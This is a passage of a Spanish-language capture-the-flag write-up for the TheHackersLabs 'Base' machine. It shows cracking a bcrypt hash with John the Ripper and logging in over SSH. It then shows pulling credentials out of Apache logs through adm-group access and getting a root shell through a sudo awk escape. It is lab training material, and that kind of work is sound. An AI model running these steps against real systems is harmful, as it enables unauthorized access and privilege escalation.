+</span></span></code></pre></div><p>Encontraremos un archivo interesante en el directorio <code>/opt</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>www-data@TheHackersLabs-Base:/home/pedro$ cd /opt
+</span></span><span style="display:flex;"><span>www-data@TheHackersLabs-Base:/opt$ ls -la
+</span></span><span style="display:flex;"><span>total <span style="color:#ae81ff">12</span>
+</span></span><span style="display:flex;"><span>drwxr-xr-x  <span style="color:#ae81ff">2</span> root  root  <span style="color:#ae81ff">4096</span> Sep <span style="color:#ae81ff">10</span>  <span style="color:#ae81ff">2024</span> .
+</span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#ae81ff">19</span> root  root  <span style="color:#ae81ff">4096</span> Sep <span style="color:#ae81ff">10</span>  <span style="color:#ae81ff">2024</span> ..
+</span></span><span style="display:flex;"><span>-rw-r--r--  <span style="color:#ae81ff">1</span> pedro pedro   <span style="color:#ae81ff">61</span> Sep <span style="color:#ae81ff">10</span>  <span style="color:#ae81ff">2024</span> hash.txt
+</span></span></code></pre></div><p>Al leerlo, resulta ser un hash:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>www-data@TheHackersLabs-Base:/opt$ cat hash.txt 
+</span></span><span style="display:flex;"><span>$2b$12$Qq75yQ3G.ydG2nxr4LzAPeJ6GE8po1NtjOAGZ2l1aIGa5//I5J/Xq
+</span></span></code></pre></div><p>Podemos copiarlo en nuestra máquina y tratar de crackearlo con la herramienta <strong>JohnTheRipper</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>john -w:/usr/share/wordlists/rockyou.txt hash
+</span></span><span style="display:flex;"><span>Using default input encoding: UTF-8
+</span></span><span style="display:flex;"><span>Loaded <span style="color:#ae81ff">1</span> password hash <span style="color:#f92672">(</span>bcrypt <span style="color:#f92672">[</span>Blowfish 32/64 X3<span style="color:#f92672">])</span>
+</span></span><span style="display:flex;"><span>Cost <span style="color:#ae81ff">1</span> <span style="color:#f92672">(</span>iteration count<span style="color:#f92672">)</span> is <span style="color:#ae81ff">4096</span> <span style="color:#66d9ef">for</span> all loaded hashes
+</span></span><span style="display:flex;"><span>Will run <span style="color:#ae81ff">6</span> OpenMP threads
+</span></span><span style="display:flex;"><span>Press <span style="color:#e6db74">&#39;q&#39;</span> or Ctrl-C to abort, almost any other key <span style="color:#66d9ef">for</span> status
+</span></span><span style="display:flex;"><span>*****           <span style="color:#f92672">(</span>?<span style="color:#f92672">)</span>     
+</span></span><span style="display:flex;"><span>1g 0:00:00:01 DONE <span style="color:#f92672">(</span>2025-09-01 12:05<span style="color:#f92672">)</span> 0.6451g/s 34.83p/s 34.83c/s 34.83C/s 123456..basketball
+</span></span><span style="display:flex;"><span>Use the <span style="color:#e6db74">&#34;--show&#34;</span> option to display all of the cracked passwords reliably
+</span></span><span style="display:flex;"><span>Session completed.
+</span></span></code></pre></div><p>Parece ser una contraseña, quizá de alguno de los usuarios.</p>
+<p>Resultó ser la contraseña del <strong>usuario pedro</strong>, con la que podemos ganar acceso a la máquina vía <strong>SSH</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ssh pedro@192.168.100.70
+</span></span><span style="display:flex;"><span>pedro@192.168.100.70<span style="color:#960050;background-color:#1e0010">&#39;</span>s password: 
+</span></span><span style="display:flex;"><span>Linux TheHackersLabs-Base 6.1.0-25-amd64 <span style="color:#75715e">#1 SMP PREEMPT_DYNAMIC Debian 6.1.106-3 (2024-08-26) x86_64</span>
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>pedro@TheHackersLabs-Base:~$ whoami
+</span></span><span style="display:flex;"><span>pedro
+</span></span></code></pre></div><h3 id="Adm">Abusando de Grupo Adm para Leer Archivos Restringidos</h3>
+<p>Veamos qué privilegios tiene nuestro usuario:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>pedro@TheHackersLabs-Base:~$ sudo -l
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>sudo<span style="color:#f92672">]</span> contraseña para pedro: 
+</span></span><span style="display:flex;"><span>Sorry, user pedro may not run sudo on TheHackersLabs-Base.
+</span></span></code></pre></div><p>No tienen privilegios.</p>
+<p>Veamos a qué grupos pertenece:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>pedro@TheHackersLabs-Base:~$ id
+</span></span><span style="display:flex;"><span>uid<span style="color:#f92672">=</span>1001<span style="color:#f92672">(</span>pedro<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>1001<span style="color:#f92672">(</span>pedro<span style="color:#f92672">)</span> grupos<span style="color:#f92672">=</span>1001<span style="color:#f92672">(</span>pedro<span style="color:#f92672">)</span>,4<span style="color:#f92672">(</span>adm<span style="color:#f92672">)</span>
+</span></span></code></pre></div><p>Bien, estamos dentro del <strong>grupo adm</strong>.</p>
+<table>
+	<thead>
+			<tr>
+					<th style="text-align: center"><strong>Grupo Adm</strong></th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td style="text-align: center"><em>En Linux, el grupo adm es un grupo de administración ligera, diferente de sudo o wheel que permiten ejecutar comandos como root. Su función principal es permitir que los miembros lean archivos de logs del sistema y suele estar presente en distribuciones Debian, Ubuntu y derivadas.</em></td>
+			</tr>
+	</tbody>
+</table>
+<p>Podemos buscar con <strong>find</strong> qué archivos pertenecen al <strong>grupo adm</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>pedro@TheHackersLabs-Base:~$ find / -group adm 2&gt;/dev/null
+</span></span><span style="display:flex;"><span>/var/log/apt/term.log.1.gz
+</span></span><span style="display:flex;"><span>/var/log/apt/term.log
+</span></span><span style="display:flex;"><span>/var/log/apache2
+</span></span><span style="display:flex;"><span>/var/log/apache2/access.log.1
+</span></span><span style="display:flex;"><span>/var/log/apache2/other_vhosts_access.log
+</span></span><span style="display:flex;"><span>/var/log/apache2/access.log.3.gz
+</span></span><span style="display:flex;"><span>/var/log/apache2/access.log
+</span></span><span style="display:flex;"><span>/var/log/apache2/other_vhosts_access.log.2.gz
+</span></span><span style="display:flex;"><span>/var/log/apache2/error.log.2.gz
+</span></span><span style="display:flex;"><span>/var/log/apache2/access.log.2.gz
+</span></span><span style="display:flex;"><span>/var/log/apache2/other_vhosts_access.log.1
+</span></span><span style="display:flex;"><span>/var/log/apache2/error.log
+</span></span><span style="display:flex;"><span>/var/log/apache2/error.log.3.gz
+</span></span><span style="display:flex;"><span>/var/log/apache2/error.log.1
+</span></span><span style="display:flex;"><span>/var/log/cups/access_log.2.gz
+</span></span><span style="display:flex;"><span>/var/log/cups/access_log.3.gz
+</span></span><span style="display:flex;"><span>/var/log/cups/access_log.1
+</span></span><span style="display:flex;"><span>/var/log/cups/access_log
+</span></span></code></pre></div><p>De acuerdo con el siguiente blog, podemos encontrar usuarios y contraseñas dentro de los logs de los servicios activos de la máquina como <strong>SSH</strong>:</p>
+<ul>
+<li><a href="https://medium.com/@evyeveline1/im-in-the-adm-group-can-i-escalate-yes-eventually-9475b968b97a" target="_blank">I’m in the ADM Group — Can I Escalate? Yes… Eventually.</a></li>
+</ul>
+<p>En este caso, no vemos algún log de <strong>SSH</strong>, pero sí de <strong>Apache2</strong>.</p>
+<p>Quizá en alguno de los archivos <strong>access</strong> de <strong>Apache2</strong> tenga un usuario y contraseña.</p>
+<p>Pero, en los archivos <code>apache2/access.log</code> y <code>apache2/access.log.1</code> no encontraremos algo, por lo que falta verificar los comprimidos.</p>
+<p>Levanta un servidor con <strong>Python3</strong> en la máquina víctima:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>pedro@TheHackersLabs-Base:~$ cd /var/log/apache2
+</span></span><span style="display:flex;"><span>pedro@TheHackersLabs-Base:/var/log/apache2$ python3 -m http.server <span style="color:#ae81ff">8000</span>
+</span></span><span style="display:flex;"><span>Serving HTTP on 0.0.0.0 port <span style="color:#ae81ff">8000</span> <span style="color:#f92672">(</span>http://0.0.0.0:8000/<span style="color:#f92672">)</span> ...
+</span></span></code></pre></div><p>Con <strong>wget</strong>, descarga ambos archivos en tu máquina:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>wget http://192.168.100.70:8000/access.log.2.gz
+</span></span><span style="display:flex;"><span>wget http://192.168.100.70:8000/access.log.3.gz
+</span></span></code></pre></div><p>Descomprime cada uno con la herramienta <strong>gunzip</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gunzip access.log.2.gz access.log.3.gz
+</span></span><span style="display:flex;"><span>❯ ls
+</span></span><span style="display:flex;"><span>access.log.2  access.log.3  hash  webshell.php
+</span></span></code></pre></div><p>Bien, podemos leer esos archivos y usar <strong>grep</strong> para buscar <strong>username</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>❯ cat access.log.2 | grep <span style="color:#e6db74">&#39;username&#39;</span>
+</span></span><span style="display:flex;"><span>203.0.113.56 - flate <span style="color:#f92672">[</span>12/Sep/2024:12:03:55 +0000<span style="color:#f92672">]</span> <span style="color:#e6db74">&#34;POST /login HTTP/1.1&#34;</span> <span style="color:#ae81ff">401</span> <span style="color:#ae81ff">4812</span> <span style="color:#e6db74">&#34;http://example.com/login&#34;</span> <span style="color:#e6db74">&#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64)&#34;</span> <span style="color:#e6db74">&#34;username=flate&amp;password=******&#34;</span>
+</span></span><span style="display:flex;"><span>                                                                                                                                                                                              
+</span></span><span style="display:flex;"><span>❯ cat access.log.3 | grep <span style="color:#e6db74">&#39;username&#39;</span>
+</span></span><span style="display:flex;"><span>172.16.241.171 -   <span style="color:#f92672">[</span>10/Sep/2024:11:47:00 -0600<span style="color:#f92672">]</span> <span style="color:#e6db74">&#34;GET /login.php?username=flate&amp;password=******** HTTP/1.1&#34;</span> <span style="color:#ae81ff">404</span> <span style="color:#ae81ff">1234</span> <span style="color:#e6db74">&#34;http://172.16.241.180/somepage.php&#34;</span> <span style="color:#e6db74">&#34;Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0&#34;</span>
+</span></span></code></pre></div><p>En ambos encontramos la contraseña del <strong>usuario flate</strong> y con esto podemos entrar vía <strong>SSH</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ssh flate@192.168.100.70
+</span></span><span style="display:flex;"><span>flate@192.168.100.70<span style="color:#960050;background-color:#1e0010">&#39;</span>s password: 
+</span></span><span style="display:flex;"><span>Linux TheHackersLabs-Base 6.1.0-25-amd64 <span style="color:#75715e">#1 SMP PREEMPT_DYNAMIC Debian 6.1.106-3 (2024-08-26) x86_64</span>
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>flate@TheHackersLabs-Base:~$ whoami
+</span></span><span style="display:flex;"><span>flate
+</span></span></code></pre></div><h3 id="awk">Escalando Privilegios Abusando de Permisos Sudoers Sobre Binario AWK</h3>
+<p>Veamos qué privilegios tiene nuestro usuario:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>flate@TheHackersLabs-Base:~$ sudo -l
+</span></span><span style="display:flex;"><span>Matching Defaults entries <span style="color:#66d9ef">for</span> flate on TheHackersLabs-Base:
+</span></span><span style="display:flex;"><span>    env_reset, mail_badpass, secure_path<span style="color:#f92672">=</span>/usr/local/sbin<span style="color:#ae81ff">\:</span>/usr/local/bin<span style="color:#ae81ff">\:</span>/usr/sbin<span style="color:#ae81ff">\:</span>/usr/bin<span style="color:#ae81ff">\:</span>/sbin<span style="color:#ae81ff">\:</span>/bin, use_pty
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>User flate may run the following commands on TheHackersLabs-Base:
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> NOPASSWD: /usr/bin/awk
+</span></span></code></pre></div><p>Podemos usar el <strong>binario awk</strong> como <strong>Root</strong>.</p>
+<p>Encontraremos una forma de escalar privilegios en la <strong>guía de GTFOBins</strong>:</p>
+<ul>
+<li><a href="https://gtfobins.github.io/gtfobins/awk/" target="_blank">GTFOBins: awk</a></li>
+</ul>
+<p>Utilizaremos el siguiente comando:</p>
+<p align="center">
+<img src="/assets/images/THL-writeup-base/Captura20.png">
+</p>
+<p>Ejecutémoslo:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>flate@TheHackersLabs-Base:~$ sudo awk <span style="color:#e6db74">&#39;BEGIN {system(&#34;/bin/bash&#34;)}&#39;</span>
+</span></span><span style="display:flex;"><span>root@TheHackersLabs-Base:/home/flate# whoami
+</span></span><span style="display:flex;"><span>root
+</span></span></code></pre></div><p>Somos <strong>Root</strong>.</p>
+<p>Busquemos la última flag:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>root@TheHackersLabs-Base:/home/flate# cd /root
+</span></span><span style="display:flex;"><span>root@TheHackersLabs-Base:~# ls
+</span></span><span style="display:flex;"><span>root.txt
+</span></span><span style="display:flex;"><span>root@TheHackersLabs-Base:~# cat root.txt
+</span></span><span style="display:flex;"><span>...
+</span></span></code></pre></div><p>Y con esto, terminamos la máquina.</p>
+
+
+    
+    <h2 id="links-de-investigacion">Links de investigación</h2>
+    <ul>
+      <li><a href="https://github.com/flatpressblog/flatpress/issues/152" target="_blank" rel="noopener noreferrer">https://github.com/flatpressblog/flatpress/issues/152</a></li><li><a href="https://medium.com/@evyeveline1/im-in-the-adm-group-can-i-escalate-yes-eventually-9475b968b97a" target="_blank" rel="noopener noreferrer">https://medium.com/@evyeveline1/im-in-the-adm-group-can-i-escalate-yes-eventually-9475b968b97a</a></li><li><a href="https://gtfobins.github.io/gtfobins/awk/" target="_blank" rel="noopener noreferrer">https://gtfobins.github.io/gtfobins/awk/</a></li>
+    </ul>
+    
+  </div>
+
+  
+
+
+  
+
+  
+
+
+
+
+
+
+
+
+
+
+<nav class="post-nav">
+  
+  <a class="post-nav-link post-nav-prev" href="http://localhost:1313/THL-writeup-facultad/">
+    <span class="post-nav-label">← Anterior</span>
+    <span class="post-nav-title">Facultad - TheHackerLabs</span>
+  </a>
+  
+  
+  <a class="post-nav-link post-nav-next" href="http://localhost:1313/THL-writeup-watchstore/">
+    <span class="post-nav-label">Siguiente →</span>
+    <span class="post-nav-title">WatchStore - TheHackerLabs</span>
+  </a>
+  
+</nav>
+
+
+
+</article>
+
+  </main>
+  <footer class="site-footer">
+  <div class="wrap">
+    <p>&copy; 2026 BerserkWings · México
+       · <a href="https://github.com/BerserkWings" target="_blank" rel="noopener noreferrer">GitHub</a>
+    </p>
+  </div>
+</footer>
+
+  
+
+
+<a href="#indice" class="back-to-top" id="backToTop" aria-label="Volver al índice">&uarr;</a>
+
+
+<script src="/js/main.min.15ff80349759f71df793ae28568ef0a6a9c3eb6efe99c9e96bad1d9236a26c31.js" integrity="sha256-Ff&#43;ANJdZ9x33k64oVo7wpqnD627&#43;mcnpa60dkjaibDE=" defer></script>
+
+</body>
+</html>
